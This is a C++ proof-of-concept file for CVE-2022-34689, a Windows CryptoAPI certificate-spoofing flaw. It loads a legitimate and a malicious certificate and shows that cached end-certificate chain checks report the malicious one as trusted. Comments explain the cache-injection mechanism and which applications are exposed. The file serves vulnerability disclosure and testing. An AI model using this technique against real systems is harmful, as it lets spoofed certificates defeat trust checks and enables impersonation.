/* CVE-2022-34689 PoC code
 * Copyright 2023 Akamai Technologies, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in
 * compliance with the License.  You may obtain a copy
 * of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in
 * writing, software distributed under the License is
 * distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 * CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing
 * permissions and limitations under the License.
 */

#pragma comment(lib, "crypt32.lib")

#include <stdio.h>
#include <windows.h>
#include <Wincrypt.h>
#include <wchar.h>
#include <string>
#include <iostream>

#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
#define CERTIFICATE_BUFFER_SIZE 8192

HANDLE certLegitFileHandle = NULL;
HANDLE certMaliciousFileHandle = NULL;
LPWSTR pszNameString;
CERT_CHAIN_PARA ChainPara;

using namespace std;
void MyHandleError(string s);
HCERTCHAINENGINE create_chain_engine() {

    CERT_CHAIN_ENGINE_CONFIG ChainConfig;
    CERT_ENHKEY_USAGE EnhkeyUsage;
    CERT_USAGE_MATCH CertUsage;
    HCERTCHAINENGINE hChainEngine;
    HCERTSTORE hCertStore;

    // Initialize CertEngine configurations
    if (!(pszNameString = (LPWSTR)malloc(256)))
        MyHandleError("Memory allocation failed.");
    EnhkeyUsage.cUsageIdentifier = 0;
    EnhkeyUsage.rgpszUsageIdentifier = NULL;
    CertUsage.dwType = USAGE_MATCH_TYPE_AND;
    CertUsage.Usage = EnhkeyUsage;
    ChainPara.cbSize = sizeof(CERT_CHAIN_PARA);
    ChainPara.RequestedUsage = CertUsage;

    ChainConfig.cbSize = sizeof(CERT_CHAIN_ENGINE_CONFIG);
    ChainConfig.hRestrictedRoot = NULL;
    ChainConfig.hRestrictedTrust = NULL;
    ChainConfig.hRestrictedOther = NULL;
    ChainConfig.cAdditionalStore = 1;
    //the flag CERT_CHAIN_CACHE_END_CERT will enable the caching mechanism for end certificates
    //which will allow us to inject our modified legitimate certificate into the cache.
    ChainConfig.dwFlags = CERT_CHAIN_CACHE_END_CERT;
    ChainConfig.dwUrlRetrievalTimeout = 0;
    ChainConfig.MaximumCachedCertificates = 11;
    ChainConfig.CycleDetectionModulus = 0;
    ChainConfig.hExclusiveRoot = NULL;
    ChainConfig.hExclusiveTrustedPeople = NULL;
    if (! (hCertStore = CertOpenSystemStore(NULL, L"CA")))
    {
        MyHandleError("The CA system store did not open.");
    }
    ChainConfig.rghAdditionalStore = &hCertStore;

    // Create the custom certificate chain engine from the configuration.

    if (CertCreateCertificateChainEngine(
        &ChainConfig,
        &hChainEngine))
    {
        printf("[V] The chain engine has been created.\n");
    }
    else
    {
        MyHandleError("[X] The engine creation function failed.");
    }
    return NULL;
}
bool get_user_cert_context(PCCERT_CONTEXT* context)
{
    CERT_CONTEXT             pDesiredCert;
    BOOL                     result = FALSE;
    string                   certFile;
    HRESULT                  hr = S_OK;
    BYTE                     certEncoded[CERTIFICATE_BUFFER_SIZE] = { 0 };
    DWORD                    certEncodedSize = 0L;

    for (int i = 0; i < 2; i++)
    {
        printf("[+] Enter certificate path: ");
        cin >> certFile;
        certLegitFileHandle = CreateFileA(certFile.c_str(),
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (INVALID_HANDLE_VALUE == certLegitFileHandle) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            MyHandleError("Cert file could not be opened!");
        }

        if (!SUCCEEDED(hr)) {
            return -1;
        }
        printf("[V] Cert file opened!\n");
        if (GetFileSize(certLegitFileHandle, NULL) <= CERTIFICATE_BUFFER_SIZE) {
            result = ReadFile(certLegitFileHandle,
                certEncoded,
                CERTIFICATE_BUFFER_SIZE,
                &certEncodedSize,
                NULL);
            if (!result) {
                return -1;
                MyHandleError("Cert reading error");
            }
            else
            {
                printf("[*] Cert file read to buffer!\n");
                pDesiredCert.cbCertEncoded = certEncodedSize;
                pDesiredCert.pbCertEncoded = certEncoded;
                //create a certificate context from the given certificate
                if (context[i] = CertCreateCertificateContext(
                    MY_ENCODING_TYPE,              // The encoding type
                    pDesiredCert.pbCertEncoded,   // The encoded data from
                    pDesiredCert.cbCertEncoded))  // The length of the encoded data
                {
                    printf("[V] A new certificate Context has been created.\n");
                    printf("[*] Cert size of the cert is: %p\n", pDesiredCert.cbCertEncoded);
                    printf("[*] Cert size of the cert in context: %p\n", context[i]->cbCertEncoded);
                }
            }
        }
        
    }
    return 1;
    
}
string return_status(PCCERT_CHAIN_CONTEXT pChainContext)
{ 
    //---------------------------------------------------------------
    // Display some of the contents of the chain.

    /*printf("[*] The size of the chain context "
        "is %d. \n", pChainContext->cbSize);
    printf("[*] %d simple chains found.\n", pChainContext->cChain);
    
    printf("\nInfo status for the chain:\n");
    DWORD infoStatus = pChainContext->TrustStatus.dwInfoStatus;

    if ((infoStatus & CERT_TRUST_HAS_EXACT_MATCH_ISSUER) != 0)
    {
        printf("An exact match issuer certificate has been found for "
            "this certificate.\n");
    }
    if ((infoStatus & CERT_TRUST_HAS_KEY_MATCH_ISSUER) != 0)
    {
        printf("A key match issuer certificate has been found for this "
            "certificate.\n");
    }
    if ((infoStatus & CERT_TRUST_HAS_NAME_MATCH_ISSUER) != 0)
    {
        printf("A name match issuer certificate has been found for this "
            "certificate.\n");
    }
    if ((infoStatus & CERT_TRUST_IS_SELF_SIGNED) != 0)
    {
        printf("This certificate is self-signed.\n");
    }
    if ((infoStatus & CERT_TRUST_IS_COMPLEX_CHAIN) != 0)
    {
        printf("The certificate chain created is a complex chain.\n");
    }
    else // No dwInfoStatus bits set
    {
        printf("No information status reported.\n");
    }*/
    DWORD errorStatus = pChainContext->TrustStatus.dwErrorStatus;
    if ((errorStatus & CERT_TRUST_IS_NOT_TIME_VALID) != 0)
    {
        return "This certificate or one of the certificates in the "
            "certificate chain is not time-valid.";
    }
    if ((errorStatus & CERT_TRUST_IS_REVOKED) != 0)
    {
        return "Trust for this certificate or one of the certificates "
            "in the certificate chain has been revoked.";
    }
    if ((errorStatus & CERT_TRUST_IS_NOT_SIGNATURE_VALID) != 0)
    {
        return "The certificate or one of the certificates in the "
            "certificate chain does not have a valid signature.";
    }
    if ((errorStatus & CERT_TRUST_IS_NOT_VALID_FOR_USAGE) != 0)
    {
        return "The certificate or certificate chain is not valid "
            "in its proposed usage.";
    }
    if ((errorStatus & CERT_TRUST_IS_UNTRUSTED_ROOT) != 0)
    {
        return "The certificate or certificate chain is based "
            "on an untrusted root.";
    }
    if ((errorStatus & CERT_TRUST_REVOCATION_STATUS_UNKNOWN) != 0)
    {
        return "The revocation status of the certificate or one of the"
            "certificates in the certificate chain is unknown.";
    }
    if ((errorStatus & CERT_TRUST_IS_CYCLIC) != 0)
    {
        return "One of the certificates in the chain was issued by a "
            "certification authority that the original certificate "
            "had certified.";
    }
    if ((errorStatus & CERT_TRUST_IS_PARTIAL_CHAIN) != 0)
    {
        return "The certificate chain is not complete.";
    }
    if ((errorStatus & CERT_TRUST_CTL_IS_NOT_TIME_VALID) != 0)
    {
        return "A CTL used to create this chain was not time-valid.";
    }
    if ((errorStatus & CERT_TRUST_CTL_IS_NOT_SIGNATURE_VALID) != 0)
    {
        return "A CTL used to create this chain did not have a valid "
            "signature.";
    }
    if ((errorStatus & CERT_TRUST_CTL_IS_NOT_VALID_FOR_USAGE) != 0)
    {
        return "A CTL used to create this chain did not have a valid "
            "signature.";
    }
    else // Chain is trusted
    {
        return "CERT_TRUST_NO_ERROR";
    }
}
int main()
{
    
    HCERTCHAINENGINE         hChainEngine = NULL;
    PCCERT_CHAIN_CONTEXT     pChainContext;
    DWORD                    dwFlags= CERT_CHAIN_CACHE_END_CERT;
    PCCERT_CONTEXT           pCertContext[2];
    HRESULT                  hr = S_OK;
    string                   results[2];
    //this CVE applies to applications that enabled their cache for end certificates, to do that the applications need to use the dwflag CERT_CHAIN_CACHE_END_CERT
    //We can either specify it directly to the function or create a chain engine that uses this flag
    // enable this to create a chain engine with the right flag
    //hChainEngine = create_chain_engine();
 
    //get the user certificates as input and convert them to PCCERT_CONTEXT struct
    get_user_cert_context(pCertContext);
    //CertGetCertificateChain is the WinAPI that calls the internal vulnerable functions
    //here we supply the chain engine with the correct flag and our certificate contexts we got from the user
    //when the function return we print the TrustStatus of both pChainContexts
    for (int i = 0; i <= 1; i++)
    {
        if (CertGetCertificateChain
        (hChainEngine,
            pCertContext[i],
            NULL,
            NULL,
            &ChainPara,
            dwFlags,
            NULL,
            &pChainContext))
        {
            printf("[*] The chain context has been created. \n");
            //when we inspect the pChainContext.TrustStatus.dwErrorStatus it shows as valid with no errors
            //most application dont use CertVerifyCertificateChainPolicy and only check this field
            results[i] = return_status(pChainContext);
            // When finished, free the certificate context.
            CertFreeCertificateContext(pCertContext[i]);
            CertFreeCertificateChain(pChainContext);
        }
        else
        {
            MyHandleError("[X] The chain could not be created.");
            CloseHandle(certLegitFileHandle);
            CloseHandle(certMaliciousFileHandle);
            return -1;
        }
    }
    printf("[!] TrustStatus for first certificate: %s\n", results[0].c_str());
    printf("[!] TrustStatus for second Certificate: %s\n", results[1].c_str());

    //---------------------------------------------------------
    // Free handles
    CertFreeCertificateChainEngine(hChainEngine);
    CloseHandle(certLegitFileHandle);
    CloseHandle(certMaliciousFileHandle);
    // Free memory for pszNameString.
    if (pszNameString)
        free(pszNameString);
    printf("[*] All handles have been released.\n");
} // end main

//-------------------------------------------------------------------
// Microsofts MyHandleError, a simple error
// handling function to print an error message and exit 
// the program. 

void MyHandleError(string s)
{
    fprintf(stderr, "[E] An error occurred in running the program. \n");
    fprintf(stderr, "[E] %s\n", s.c_str());
    fprintf(stderr, "[E] Error number %x.\n", GetLastError());
    fprintf(stderr, "[*] Program terminating. \n");
    exit(1);
} // end MyHandleError
